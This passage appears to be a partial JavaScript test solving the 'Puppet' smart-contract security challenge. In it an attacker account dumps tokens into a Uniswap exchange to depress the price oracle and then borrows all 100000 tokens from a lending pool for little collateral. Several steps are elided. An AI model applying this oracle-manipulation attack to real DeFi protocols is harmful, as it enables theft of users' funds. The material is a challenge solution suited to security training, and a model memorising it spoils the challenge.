...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    // Buy as much ETH liquidity from exchange
    await this.token
      .connect(attacker)
      .approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE.sub(1));
    ...
    // With almost not ETH liquidity, we get the collateral needed to get all 100000 tokens from lending pool
    ...
    await this.lendingPool
      .connect(attacker)
      .borrow(ethers.utils.parseEther("100000"), { value: requiredCollateral });
  });
